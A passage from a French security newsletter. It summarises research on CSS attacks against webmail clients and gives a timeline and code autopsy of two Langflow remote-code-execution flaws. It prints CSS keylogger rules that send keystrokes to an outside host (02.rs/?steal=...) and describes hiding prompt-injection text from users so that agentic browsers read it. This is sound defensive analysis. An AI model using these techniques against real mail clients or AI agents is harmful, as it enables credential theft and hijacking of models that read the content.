+  Le passage du vol de token au vol d'identifiants tient &agrave; deux id&eacute;es. La premi&egrave;re est le <em>gadget CSS</em> : Outlook bloque <code>position:fixed</code> dans le CSS de l'utilisateur, mais ses propres biblioth&egrave;ques injectent des &eacute;l&eacute;ments qui portent d&eacute;j&agrave; cette propri&eacute;t&eacute;, et l'attribut de donnees personnalis&eacute; autoris&eacute; par DOMPurify fournit le point d'accroche pour les cibler. Un <code>!important</code> suffit ensuite &agrave; &eacute;craser les protections de visibilit&eacute; et &agrave; &eacute;tendre l'&eacute;l&eacute;ment sur toute la page. La seconde est le <em>hotwiring</em> : un pseudo-&eacute;l&eacute;ment h&eacute;rite du handler de clic de son parent, donc un <code>:before</code> en <code>position:fixed</code> couvrant l'ecran avec un <code>z-index</code> &eacute;norme transforme n'importe quel clic en activation de l'&eacute;l&eacute;ment choisi.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le keylogger, lui, repose sur un &eacute;l&eacute;ment que personne ne pense &agrave; interdire. Un <code>&lt;select&gt;</code> stylis&eacute; en <code>-webkit-text-security: disc</code> ressemble &agrave; un champ mot de passe. Les s&eacute;lecteurs <code>:checked</code> sont souvent filtres, mais le combinateur de voisinage ne l'est pas : la position d'une <code>option</code> dans la liste encode le caract&egrave;re s&eacute;lectionn&eacute;, et chaque r&egrave;gle &eacute;met sa propre requ&ecirc;te.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">Capture de frappe via &lt;select&gt; et combinateurs de voisinage</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;">/* Un &lt;select&gt; maquille en champ mot de passe. */
+select { -webkit-text-security: disc; }
+
+/* :checked seul est filtre. Le combinateur de voisinage ne l'est pas,
+   et la position de l'option dans la liste encode le caractere. */
+option + option:checked          { background: url(https://02.rs/?steal=b); }
+option + option + option:checked { background: url(https://02.rs/?steal=c); }
+
+/* Sous Firefox, sortir puis rentrer l'element de l'ecran remet a zero
+   le timer de saisie clavier (~1 s), ce qui rend la capture temps reel. */
+.x_div-a:has(option[label=a]:checked) {
+    animation-name: focusTrick;
+    animation-duration: 0.5ms;
+}
+@keyframes focusTrick { from { left: -5000px } to { left: 0 } }</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Le d&eacute;tail Firefox est le plus fin du papier : d&eacute;placer l'&eacute;l&eacute;ment hors de l'ecran par animation r&eacute;initialise le timer de saisie, ce qui fait passer la capture d'un caract&egrave;re par seconde environ &agrave; du temps r&eacute;el.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 20px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f7ecd6; border:2px dashed #8a5a12;">
+  <tr>
+    <td style="padding:12px 16px 6px 16px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; letter-spacing:1.5px; text-transform:uppercase; font-weight:700; color:#6b4409;">&#9888;&#65039; Hypoth&egrave;se non test&eacute;e</td>
+  </tr>
+  <tr>
+    <td style="padding:0 16px 14px 16px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#3b2c11;">Trois &eacute;l&eacute;ments sont explicitement donn&eacute;s comme non aboutis par l'auteur, et il faut les lire comme tels. Le keylogger temps r&eacute;el d&eacute;crit ci-dessus depend du comportement de timer de Firefox ; sous Chrome, le timing differe et la technique ne tient pas en l'&eacute;tat. La variante Chrome reposerait sur les <em>interest invokers</em> (attribut <code>interestfor</code>), qui ne sont pas d&eacute;ploy&eacute;s en production et ne figurent dans aucune allow-list. Enfin, un keylogger sans CSS reposant sur l'&eacute;l&eacute;ment propose <code>&lt;selectedcontent&gt;</code> et des images en chargement paresseux est pr&eacute;sent&eacute; comme une piste, non comme un r&eacute;sultat.</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Une derni&egrave;re primitive m&eacute;rite d'&ecirc;tre isol&eacute;e, parce qu'elle vise un lecteur qui n'est pas humain. Les pseudo-&eacute;l&eacute;ments <code>:before</code> et <code>:after</code> injectent du texte via la propri&eacute;t&eacute; <code>content</code>, et ce texte peut &ecirc;tre rendu invisible &agrave; l'oeil par une opacit&eacute; du type <code>0.00000001</code> sans disparaitre pour autant du document. Un navigateur agentique qui lit la page &mdash; Heyes cite Atlas d'OpenAI &mdash; voit le texte que l'utilisateur ne voit pas. Le canal n'exfiltre rien : il injecte, et la cible est le mod&egrave;le qui r&eacute;sume ou traite le message. C'est une injection de prompt indirecte dont le vecteur est une feuille de style, et elle &eacute;chappe par construction aux filtres qui raisonnent sur le texte visible.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Les limites r&eacute;elles de cette famille d'attaques sont op&eacute;rationnelles plutot que techniques. Presque tout exige une interaction : le keylogger suppose que la victime tape dans le faux champ, le hotwiring suppose un clic, l'oracle de hauteur suppose que le secret est present dans le DOM du message. Les techniques sont aussi tr&egrave;s li&eacute;es &agrave; un couple client-navigateur donn&eacute; &mdash; la mutation qui fonctionne sur un sanitizer CSSOM ne dit rien d'un sanitizer qui travaille sur le texte brut, et le quirk d'accolade est propre &agrave; Firefox. Un payload qui traverse Gmail ne traverse pas Outlook. C'est un travail d'artisanat par cible, pas une primitive universelle.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  C&ocirc;t&eacute; d&eacute;fense, la liste que donne l'auteur est courte et sa hi&eacute;rarchie est claire. Le seul contr&ocirc;le structurel est l'isolation : rendre le message dans une iframe restreinte, pour que le CSS hostile ne puisse pas atteindre l'interface du client. Tout le reste est du colmatage utile mais partiel &mdash; interdire <code>&lt;select&gt;</code>, rejeter <code>:has()</code>, <code>:checked</code>, <code>:focus</code> et <code>:not()</code>, imposer une allow-list stricte de caract&egrave;res sur les noms et mots-cl&eacute;s (c'est elle qui tue les mutations), proxifier toutes les ressources distantes, bloquer les URL <code>data:</code>, et inventorier ses propres gadgets avant d'autoriser des attributs de donnees personnalises. La derni&egrave;re recommandation est la plus r&eacute;v&eacute;latrice : si vous ne savez pas quels gadgets votre interface expose, n'autorisez pas les attributs qui permettent de les d&eacute;signer.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le fil commun avec la Partie 02 est net. Dans les deux cas, un contr&ocirc;le v&eacute;rifie correctement ce qu'il regarde, et se trompe sur ce que cela implique. Le backend d'attestation valide des signatures authentiques et en conclut &agrave; tort quelque chose sur l'appareil d'en face ; le sanitizer valide un CSSOM correct et en conclut &agrave; tort quelque chose sur le document que le navigateur va rendre. Dans les deux cas, l'ecart n'est pas dans la v&eacute;rification mais entre la v&eacute;rification et l'objet r&eacute;el.
+</td>
+</tr>
+<tr>
+<td style="padding:8px 30px 30px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f1efea; border:1px solid #dcd8d0;">
+  <tr><td style="padding:12px 16px 8px 16px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1.5px; text-transform:uppercase; color:#5f5c55; font-weight:700; border-bottom:1px solid #dcd8d0;">Sources &mdash; partie 03</td></tr>
+  <tr>
+    <td style="padding:12px 16px 14px 16px;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; font-family:Consolas,'SF Mono',Menlo,monospace;">
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[14]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-06</span> &nbsp;&middot;&nbsp; Gareth Heyes, PortSwigger Research &mdash; <a href="https://portswigger.net/research/css-the-bomb-inside-your-inbox" style="color:#2f5474;">CSS: the bomb inside your inbox</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[15]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-12</span> &nbsp;&middot;&nbsp; MDN Web Docs &mdash; <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/descent-override" style="color:#2f5474;">@font-face descent-override</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700;">[16]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-12</span> &nbsp;&middot;&nbsp; MDN Web Docs &mdash; <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has" style="color:#2f5474;">:has() - pseudo-classe relationnelle, disponible depuis decembre 2023</a></td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td id="partie-4" style="padding:14px 30px 0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:3px solid #1e1d1b;">
+  <tr><td style="padding:10px 0 0 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; letter-spacing:2px; text-transform:uppercase; color:#7a4a2e; font-weight:700;">Partie 04 &nbsp;&middot;&nbsp; Autopsie d'attaque</td></tr>
+  <tr><td style="padding:4px 0 6px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:24px; line-height:29px; font-weight:700; color:#1e1d1b; letter-spacing:-0.3px;">Autopsie Langflow : le correctif qui a trait&eacute; le sympt&ocirc;me et laisse la porte</td></tr>
+  <tr><td style="padding:0 0 14px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:14px; line-height:21px; color:#5f5c55;">Deux RCE non authentifi&eacute;es en onze jours sur le m&ecirc;me produit, la seconde reposant sur la primitive que la premi&egrave;re n'avait pas retir&eacute;e. Ajout&eacute;e au KEV le 4 ao&ucirc;t avec trois jours pour corriger.</td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Langflow est un outil de composition visuelle de workflows LLM : on y branche des mod&egrave;les, des bases, des services cloud et des syst&egrave;mes internes. C'est donc, par construction, un n&oelig;ud qui d&eacute;tient des identifiants vers &agrave; peu pr&egrave;s tout ce qui compte dans un SI. Le produit est maintenu par IBM. Entre le 21 juin et le 2 juillet 2026, IBM a publi&eacute; deux bulletins pour deux ex&eacute;cutions de code &agrave; distance non authentifi&eacute;es. La seconde n'est pas une nouvelle vuln&eacute;rabilit&eacute; : c'est la premi&egrave;re, d&eacute;barrass&eacute;e de ce qui la rendait compliqu&eacute;e.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 20px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:0 10px 14px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">1</td></tr></table></td>
+    <td valign="top" style="padding:0 0 14px 0; border-bottom:1px solid #e3dfd7; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">21 juin 2026 &nbsp;&middot;&nbsp; PREMIER BULLETIN - CVE-2026-10561, CVSS 10.0</span><br>IBM publi&eacute; un bulletin pour le <code>PythonREPLComponent</code>, versions 1.0.0 &agrave; 1.9.3. Deux d&eacute;fauts se combinent : la m&eacute;thode <code>get_globals()</code> construit un dictionnaire de globals cens&eacute; &ecirc;tre restreint mais n'y place jamais <code>__builtins__</code> vide, et le produit active par d&eacute;faut <code>LANGFLOW_AUTO_LOGIN=true</code>. Le premier d&eacute;faut donne une &eacute;vasion de sandbox, le second la rend accessible sans authentification. Corrig&eacute; en 1.9.4.</td>
+  </tr>
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:14px 10px 14px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">2</td></tr></table></td>
+    <td valign="top" style="padding:14px 0; border-bottom:1px solid #e3dfd7; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">2 juillet 2026 &nbsp;&middot;&nbsp; SECOND BULLETIN - CVE-2026-9198, CVSS 9.8</span><br>Onze jours plus tard, m&ecirc;me produit, m&ecirc;me r&eacute;sultat, chemin diff&eacute;rent. IBM d&eacute;crit la cha&icirc;ne dans ses propres termes : <code>/api/v1/auto_login</code> <em>mints SUPERUSER tokens to any network caller</em>, puis <code>/api/v1/validate/code</code> <em>executes user code via exec()</em>. Versions 1.0.0 &agrave; 1.10.0, vecteur <code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>, corrig&eacute; en 1.10.1. Le bulletin ne propose <strong>aucun contournement</strong>.</td>
+  </tr>
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:14px 10px 14px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">3</td></tr></table></td>
+    <td valign="top" style="padding:14px 0; border-bottom:1px solid #e3dfd7; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">6 juillet 2026 &nbsp;&middot;&nbsp; PREMI&EGRAVE;RE TENTATIVE D'EXPLOITATION OBSERV&EACUTE;E</span><br>Les sondes de KEVintel enregistrent la premi&egrave;re tentative, quatre jours apr&egrave;s la publication du bulletin. La fen&ecirc;tre entre correctif disponible et exploitation observ&eacute;e se compte donc en jours, pas en semaines &mdash; c'est le rythme habituel des cibles expos&eacute;es sur Internet et d&eacute;crites publiquement.</td>
+  </tr>
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:14px 10px 14px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">4</td></tr></table></td>
+    <td valign="top" style="padding:14px 0; border-bottom:1px solid #e3dfd7; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">17 juillet 2026 &nbsp;&middot;&nbsp; DIVULGATION PUBLIQUE DE LA FICHE CVE</span><br>KEVintel date de ce jour la divulgation publique du CVE, soit quinze jours apr&egrave;s le bulletin IBM. Les deux dates coexistent dans les sources sans &ecirc;tre r&eacute;concili&eacute;es : la plus probable est un bulletin fournisseur le 2 juillet suivi de la publication de la fiche CVE le 17. Nous retenons la date IBM comme date de disponibilit&eacute; du correctif, parce que c'est celle qui compte pour un d&eacute;fenseur.</td>
+  </tr>
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:14px 10px 14px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">5</td></tr></table></td>
+    <td valign="top" style="padding:14px 0; border-bottom:1px solid #e3dfd7; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">21 juillet 2026 &nbsp;&middot;&nbsp; POC PUBLIC</span><br>Du code de d&eacute;monstration circule publiquement. A partir de ce point, l'exploitation ne demande plus de comprendre la cha&icirc;ne &mdash; seulement de trouver une instance.</td>
+  </tr>
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:14px 10px 14px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">6</td></tr></table></td>
+    <td valign="top" style="padding:14px 0; border-bottom:1px solid #e3dfd7; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">29 juillet 2026 &nbsp;&middot;&nbsp; TEMPLATE NUCLEI</span><br>Une signature de d&eacute;tection Nuclei devient disponible. Elle sert autant &agrave; l'inventaire d&eacute;fensif qu'au balayage offensif, et sa date marque le moment ou le co&ucirc;t de la recherche de cibles tombe &agrave; z&eacute;ro des deux c&ocirc;t&eacute;s.</td>
+  </tr>
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:14px 10px 14px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">7</td></tr></table></td>
+    <td valign="top" style="padding:14px 0; border-bottom:1px solid #e3dfd7; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">4 ao&ucirc;t 2026 &nbsp;&middot;&nbsp; AJOUT AU KEV, &EACUTE;CH&EACUTE;ANCE AU 7</span><br>La CISA inscrit CVE-2026-9198 au catalogue des vuln&eacute;rabilit&eacute;s exploit&eacute;es connues &mdash; <em>vendorProject</em> IBM, <em>product</em> Langflow &mdash; avec une &eacute;ch&eacute;ance de rem&eacute;diation BOD 26-04 au 7 ao&ucirc;t, soit trois jours. Le champ <code>knownRansomwareCampaignUse</code> est &agrave; <code>Unknown</code>. Le m&ecirc;me jour, Tomcat et N-central rejoignent le catalogue.</td>
+  </tr>
+  <tr>
+    <td width="34" valign="top" style="width:34px; padding:14px 10px 0 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="26" height="26" align="center" valign="middle" style="width:26px; height:26px; background-color:#7a4a2e; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f9f6f1; line-height:26px;">8</td></tr></table></td>
+    <td valign="top" style="padding:14px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#2c2a26;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; color:#7d7a73; letter-spacing:1px;">12 ao&ucirc;t 2026 &nbsp;&middot;&nbsp; &EACUTE;TAT CUMUL&EACUTE;</span><br>746 tentatives depuis 290 adresses IP uniques, 41 pays, 18 emplacements de sonde, et environ 150 signatures User-Agent distinctes relev&eacute;es. Aucune de ces sources ne distingue le balayage de la compromission effective.</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le m&eacute;canisme du premier bug m&eacute;rite d'&ecirc;tre regarde de pr&egrave;s, parce qu'il illustre un mode d'echec de sandbox qui se reproduit partout ou l'on tente de restreindre un interpr&eacute;teur depuis l'int&eacute;rieur.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">CVE-2026-10561 - la ligne manquante</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;"># Langflow OSS &lt; 1.9.4 - PythonREPLComponent.get_globals(), forme
+# reconstituee d'apres la description du bulletin IBM pour CVE-2026-10561.
+def get_globals(self, global_imports):
+    globals_ = {}
+    for name in global_imports:              # whitelist d'imports
+        globals_[name] = importlib.import_module(name)
+    return globals_
+    # Manque une seule ligne :  globals_["__builtins__"] = {}
+
+exec(user_code, self.get_globals(...))
+
+# Semantique CPython : si la cle __builtins__ est absente du dict de
+# globals passe a exec(), l'interpreteur y insere lui-meme une reference
+# au module builtins complet. La whitelist ne restreint donc rien -
+# elle decrit ce qu'on ajoute, jamais ce qu'on retire.</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Une whitelist d'imports d&eacute;crit ce que l'on autorise en plus. Elle ne dit rien de ce qui est d&eacute;j&agrave; la, et sur exec() ce qui est d&eacute;j&agrave; la, c'est tout.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  IBM corrige cela en 1.9.4. Le correctif est juste, et il est incomplet &mdash; non pas dans son code, mais dans son p&eacute;rim&egrave;tre. Il traite l'&eacute;vasion de sandbox du <code>PythonREPLComponent</code> et laisse intactes les deux conditions qui rendaient l'&eacute;vasion exploitable &agrave; distance : un endpoint qui d&eacute;livre un jeton SUPERUSER &agrave; tout appelant r&eacute;seau, et un second endpoint qui accepte du code Python et le passe &agrave; <code>exec()</code>. Onze jours plus tard, ces deux conditions suffisent &agrave; elles seules, sans <code>PythonREPLComponent</code> et sans &eacute;vasion de whitelist. C'est CVE-2026-9198.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 8px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; table-layout:fixed; border:1px solid #cfccc4;">
+  <tr>
+    <td width="20" style="width:20; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;"></td>
+    <td width="27" style="width:27; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">CVE-2026-10561</td>
+    <td width="27" style="width:27; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">CVE-2026-9198</td>
+    <td width="26" style="width:26; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; word-break:break-word;">Ce que la comparaison dit</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Bulletin / correctif</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">21 juin 2026, corrig&eacute; en 1.9.4</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">2 juillet 2026, corrig&eacute; en 1.10.1</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Onze jours entre deux RCE non authentifi&eacute;es sur le m&ecirc;me produit</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Score</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">CVSS 10.0</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">CVSS 9.8</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Le second est note plus bas alors qu'il est plus simple &agrave; exploiter</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Chemin</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">PythonREPLComponent, __builtins__ repeuple par exec()</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">auto_login puis validate/code</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Le second n'a besoin d'aucune &eacute;vasion de sandbox</td>
+  </tr>
+  <tr>
